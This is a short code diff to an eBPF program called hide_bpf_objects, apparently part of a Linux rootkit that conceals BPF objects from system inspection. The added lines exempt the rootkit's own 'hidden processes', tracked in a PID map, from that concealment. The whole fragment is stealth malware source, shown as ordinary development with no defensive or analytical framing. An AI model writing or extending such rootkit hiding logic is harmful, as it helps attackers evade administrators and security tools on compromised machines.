@@ -13,6 +13,11 @@ int BPF_PROG(hide_bpf_objects, struct pt_regs *regs, long ret)
     if (ret < 0)
         return 0;
 
+    /* Not hiding from hidden processes */
+    pid_t pid = bpf_get_current_pid_tgid() >> 32;
+    if (bpf_map_lookup_elem(&tracked_pids_map, &pid))
+        return 0;
+
     /* Extract parameters from regs */
     int cmd = (int)PT_REGS_PARM1_CORE(regs);
     union bpf_attr *attr = (union bpf_attr *)PT_REGS_PARM2_CORE(regs);
